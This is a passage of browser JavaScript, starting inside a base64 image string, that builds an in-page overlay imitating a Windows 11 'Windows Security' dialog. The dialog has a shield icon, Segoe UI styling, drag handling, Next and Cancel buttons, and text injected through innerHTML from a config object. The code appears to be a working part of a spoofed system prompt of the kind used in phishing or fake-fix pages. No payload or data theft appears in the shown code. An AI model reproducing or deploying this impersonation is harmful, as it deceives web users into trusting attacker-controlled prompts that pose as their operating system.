zbXvhpf6DpEuoTXMbpH1Arn/Cn/I06f/11r2/4kSxt4JvAsik+gPsa8Q8Kf8jTp/8A11oA+lNU/wCQVd/9cm/lXyxd/wDH5P8A9dG/nX1Pqn/IKu/+uTfyr5Yu/wDj8n/66N/OgDo/C3i6Xw5BLHGWHmHPFdD/AMLTuf7z15sFY9AT9BS7H/uN+VAHrenR/wDCdgGbnPPzVo/8Kstv7qVR+FXyou7jjvXq29P76/nQB4/f66/g2T7NESBnb8tU/wDhadz/AHnqj8SQW1P5QT856Vwux/7jflQBseJtefxBqK3Tkkhcc1i0pBHUEfWkoAKKKKACiiigBW+8frSUrfeP1pKACiiigCSD/j4j/wB4fzr6j0J1bRLPB6RLXyyp2urehzXuXw+8VwXNh9nuJVRlwqhjQB5l46tJofE95LIhCO/yn1rEg1S+toxHDdSxoOiq2BX0tdaDo+qnzJ7aOY9c1W/4Qrw//wBA6KgD5zm1W/uIjHNdyuh6qzZFang20muPEllJGhZUkyx9K94/4Qrw/wD9A6KrFr4f0bS28yC1jhPXNAFvVnC6VdZP/LJv5V8tXX/H5P8A9dG/nXuXj/xXBZ6cYbeVXdsqQprwmRt8jN/eJNAHpPwz8OWut2d08+Mo2BkV33/Cv9O/2fyrnPgz/wAg+9/3q9SoA8h8VOfCTEWfb04rlP8AhYGo/wC1+ddT8V/vv9a8noA9s8N6RD4ntvPu8bsZ5Ga3f+Ff6d/s/lVL4af8gz/gArvKAPnj4jaRDo2vpbwY2lM9PpXHV6F8Xv8AkaY/+uX+Fee0AFFFFABRRRQArfeP1pKVvvH60lABRRRQAVPa3c1nKJIWww6VBRQB1tt8RvEFrGEiuAFHtU3/AAtDxL/z8r+VcZRQB2f/AAtDxL/z8r+VRXHxH8Q3MZSS4BUjHSuRooAsXd7NezGWZtzHrVeiigDc0LxZqnh6KSOwlCK5y2a1/wDhaHiX/n5X8q4yigDZ1jxNqWuEm9kD59KxqKKAOj0rxtrOjxeXaTBVxjpWh/wtDxL/AM/K/lXGUUAaWta7e6/eC6vnDygYyKzaKKACiiigAooooAVvvH60lK33j9aSgAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAFb7x+tJSt94/WkoAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigD/2Q==";
  icon.style.paddingRight = "10px";
  icon.style.paddingLeft = "10px";
  device.appendChild(icon);

  const text = document.createElement("span");
  text.textContent = name;
  try {
    text.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  text.style.cursor = "default";
  device.appendChild(text);

  device.addEventListener(
    "mouseover",
    () => (device.style.background = "#f3f3f3")
  );
  device.addEventListener(
    "mouseout",
    () => (device.style.background = "#f6f6f6")
  );

  return device;
}

var popUpOverlay;
function createWin11Popup(config) {
  // --- Create overlay ---
  const overlay = document.createElement("div");
  try {
    overlay.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  overlay.style.position = "fixed";
  overlay.style.top = "0";
  overlay.style.left = "0";
  overlay.style.width = "100vw";
  overlay.style.height = "100vh";
  //overlay.style.background = "rgba(0,0,0,0.5)";
  overlay.style.display = "flex";
  overlay.style.alignItems = "center";
  overlay.style.justifyContent = "center";
  overlay.style.zIndex = "9999";

  // --- Create popup ---
  const popup = document.createElement("div");
  try {
    popup.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  popup.style.background = "#fff";
  popup.style.width = "450px";
  popup.style.borderRadius = "8px";
  popup.style.overflow = "hidden";
  popup.style.boxShadow = "0 4px 12px rgba(0,0,0,0.3)";
  popup.style.fontFamily = "Segoe UI, sans-serif";
  popup.style.border = "1px solid #ccc";
  popup.style.position = "absolute"; // needed for dragging
  popup.style.top = "50%";
  popup.style.left = "50%";
  popup.style.transform = "translate(-50%, -50%)";
  overlay.appendChild(popup);

  // --- Header ---
  const header = document.createElement("div");
  try {
    header.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  header.style.display = "flex";
  header.style.alignItems = "center";
  header.style.justifyContent = "space-between";
  header.style.padding = "10px 14px";
  header.style.fontWeight = "600";
  //header.style.cursor = "move"; // show draggable cursor

  const headerLeft = document.createElement("span");
  try {
    headerLeft.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  headerLeft.style.display = "flex";
  headerLeft.style.alignItems = "center";
  headerLeft.style.gap = "8px";

  const shield = document.createElement("img");
  try {
    shield.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  shield.src =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB+AFEQcyJsDnyaEAAAEFUExURQAAACwsLC4uLjAwMEBAQENDQ09PT2VlZWdnZ3Nzc3V1dRQUFBUVFRYWFhcXFxgYGBkZGRoaGhsbGxwcHB0dHR4eHh8fHyAgICEhISIiIiMjIyQkJCUlJSYmJicnJygoKCkpKSoqKisrKywsLC0tLS4uLi8vLzAwMDExMTIyMjMzMzQ0NDU1NTY2Njc3Nzg4ODk5OTo6Ojs7Ozw8PD09PT4+Pj8/P0BAQEFBQUJCQkhISElJSUpKSktLS01NTU5OTk9PT1BQUFFRUVJSUlNTU1VVVVpaWltbW1xcXF1dXV5eXmBgYGFhYWNjY2RkZGhoaGlpaXJycnZ2do6OjpCQkJeXl5qamlZ8seoAAAALdFJOUwB/f39/f39/f39/UwoJKQAAA8BJREFUeNrtmmtz0zgUhgUUdkE6qmQpju3YjmPSNKkbyAVoG0hT2i2XcmmXXfj/P4UPLjShiS1fGWb0fImd8eR9chQfKbYR0mg0Go1Go/lzefjf13jj2/+Pag+f7zft8embeOfN2fTxs0//1pd+x/f6HmemG8T7gds0O8+Puv6dmuKdhiEZEKDb8TuUAjUsW0qnDgWzKRgFIBhjjOO3MMaYAABlomlWHL/YNxmNw1cFMMYYE8rMaFFh/L1+5POb+FsCGBPu7fXvVRUftGyTA04SwIRJq9WuQuFs4jc4heXvv04AE6BM+uPXZY/90SiQdDV9vQDGmFDRHh2elNd0hk6r37EMwFhNAGMwrM7AdYbzYskP/vryeeq0ep7BJb/99RMEMKFccsPrtZzp5y9/P8gYHH8Gbew8mx10BJccCKyLTxDAmAABLrnoHMymjxt0+XhFAUKF5VgG3RSeInAtQQ3LscSP8mUSwBiAJoQrCFyfFQCrxysLpJPveC2gBbSAFtACWkALaAEtoAW0QCopfwbyC4CiwC8XAcoSIEz1+s004KQCARZMFQXeTkxavgCYk7dIo9EostVWbEXXp6FK1wDevq9u4IksAkpdC4SXoQRPPEZKbkTMHWYQmPfUSqAuQIydl1l+BZ5RtgD3Mv0MXUnLFaCylUngrq80BsoCIPy72c7EcVtlSlYVILw9ztgKXj+1oDwBsIYnWZvRUahQAkUBwsPDzN3wn5FCCRQFwHp6mr0fq5RATSBXAdRKoCaQrwAIHQap/VhNgAUHuebEk4GEMgRA7B7nm5VDO21WVhEgzAryrgsilxW+Y4KZG+VemMz7KYOgIACi9yr/0ih0BC0mAIYdFlmcTboNKCIAje64SD66eJnYjlIFWDh7V0gAnQ+S5uU0ASIG56ggvlFEgPuoMPnvnN48ZVKMbbmxHyUKAJcMlcKou+l6QZIAbXRH5eSji0W0wSBBgJp7xxclCaDLsw0GmwWoGZ1eotK4OotMyCIA5t7pFSqRq5NdkeERDiJ2F5eoVD68aG2rC1D7xUdUMlv+mql5kwBzt1D5UEKIigAhQFElUCYYpAkQJvg2qgh3EDZSHuUCGQ58VBnns52VuemWADG6s3NUIe8ntlwahl8ECJP2+B2qlnB5GFYFQIaDEFXO8jCsCFRe/jXDsCRQS/l/DkPPjZcINwKEu70Q1cY8siUD8lMAmLSiV6hOwt2gya/vAQFrBv0Q1czicOiLeJP7+wfHqH6Oo2a8YUa/Ix4hhPjKi0aj0Wg0Gs0fyncF4BMyewghwAAAAABJRU5ErkJggg==";
  shield.style = "width: 20px;";
  headerLeft.appendChild(shield);

  const title = document.createElement("span");
  title.textContent = "Windows Security";
  try {
    title.style.all = "revert";
  } catch (e) {
    console.log(e);
  }

  title.style.cursor = "default";
  title.style.paddingLeft = "15px";
  title.style.fontSize = "12px";
  title.style.fontWeight = "normal";
  headerLeft.appendChild(title);

  const closeBtn = document.createElement("button");
  closeBtn.textContent = "×";
  try {
    closeBtn.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  closeBtn.style.border = "none";
  closeBtn.style.background = "none";
  closeBtn.style.fontSize = "18px";
  //closeBtn.style.cursor = "pointer";
  closeBtn.onclick = () => overlay.remove();

  header.appendChild(headerLeft);
  header.appendChild(closeBtn);
  popup.appendChild(header);

  // --- Content ---
  const content = document.createElement("div");
  content.style.padding = "16px 20px";

  const h3 = document.createElement("h3");
  h3.textContent = config.title;
  try {
    h3.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  h3.style.margin = "0 0 10px 0";
  h3.style.fontSize = "20px";
  h3.style.fontWeight = "600";
  h3.style.cursor = "default";
  content.appendChild(h3);

  const p1 = document.createElement("p");
  p1.innerHTML = config.innerHtml1;
  try {
    p1.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  p1.style.fontSize = "14px";
  p1.style.margin = "15px 0";
  p1.style.cursor = "default";
  content.appendChild(p1);

  const p2 = document.createElement("p");
  p2.innerHTML = config.innerHtml2;
  try {
    p2.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  p2.style.fontSize = "14px";
  p2.style.margin = "15px 0";
  p2.style.cursor = "default";
  content.appendChild(p2);

  const main = document.createElement("div");
  content.appendChild(main);

  popup.appendChild(content);

  // --- Footer ---
  const footer = document.createElement("div");
  try {
    footer.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  footer.style.display = "flex";
  footer.style.justifyContent = config.nextButtonOnClick
    ? "space-between"
    : "flex-end";
  footer.style.padding = "10px 20px";

  if (config.nextButtonOnClick) {
    const nextBtn = document.createElement("button");
    nextBtn.textContent = "Next";
    try {
      nextBtn.style.all = "revert";
    } catch (e) {
      console.log(e);
    }
    nextBtn.style.background = "#0067c0";
    nextBtn.style.border = "1px solid #000000";
    nextBtn.style.color = "#ffffff";
    nextBtn.style.borderRadius = "4px";
    nextBtn.style.padding = "6px 16px";
    //nextBtn.style.cursor = "pointer";
    nextBtn.style.marginBottom = "15px";
    nextBtn.style.width = "190px";
    nextBtn.style.height = "35px";
    nextBtn.onmouseenter = () => (nextBtn.style.background = "#0271d3ff");
    nextBtn.onmouseleave = () => (nextBtn.style.background = "#0067c0");
    nextBtn.onclick = () =>
      config.nextButtonOnClick(h3, p1, p2, main, nextBtn, footer);
    footer.appendChild(nextBtn);
  }

  const cancelBtn = document.createElement("button");
  cancelBtn.textContent = "Cancel";
  try {
    cancelBtn.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  cancelBtn.style.background = "#ffffff";
  cancelBtn.style.border = "1px solid #000000";
  cancelBtn.style.borderRadius = "4px";
  cancelBtn.style.padding = "6px 16px";
  //cancelBtn.style.cursor = "pointer";
  cancelBtn.style.marginBottom = "15px";
  cancelBtn.style.width = "190px";
  cancelBtn.style.height = "35px";
  cancelBtn.onmouseenter = () => (cancelBtn.style.background = "#f8f8f8f8");
  cancelBtn.onmouseleave = () => (cancelBtn.style.background = "#ffffff");
  cancelBtn.onclick = () => overlay.remove();
  footer.appendChild(cancelBtn);

  popup.appendChild(footer);

  // --- Draggable logic ---
  let isDragging = false;
  let offsetX, offsetY;

  header.addEventListener("mousedown", (e) => {
    isDragging = true;
    offsetX = e.clientX - popup.getBoundingClientRect().left;
    offsetY = e.clientY - popup.getBoundingClientRect().top;
    document.body.style.userSelect = "none"; // prevent text highlight
  });

  document.addEventListener("mousemove", (e) => {
    if (isDragging) {
      const popupRect = popup.getBoundingClientRect();
      const overlayRect = overlay.getBoundingClientRect();

      let newLeft = e.clientX - offsetX;
      let newTop = e.clientY - offsetY;

      // --- clamp values so popup stays in viewport ---
      const minLeft = 0;
      const maxLeft = overlayRect.width - popupRect.width;
      const minTop = 0;
      const maxTop = overlayRect.height - popupRect.height;

      if (newLeft < minLeft) newLeft = minLeft;
      if (newLeft > maxLeft) newLeft = maxLeft;
      if (newTop < minTop) newTop = minTop;
      if (newTop > maxTop) newTop = maxTop;

      popup.style.left = newLeft + "px";
      popup.style.top = newTop + "px";
      popup.style.transform = ""; // disable centering when dragging
    }
  });

  document.addEventListener("mouseup", () => {
    isDragging = false;
    document.body.style.userSelect = "";
  });

  // --- Append everything ---
  document.body.appendChild(overlay);
  popUpOverlay = overlay;
  return main;
}
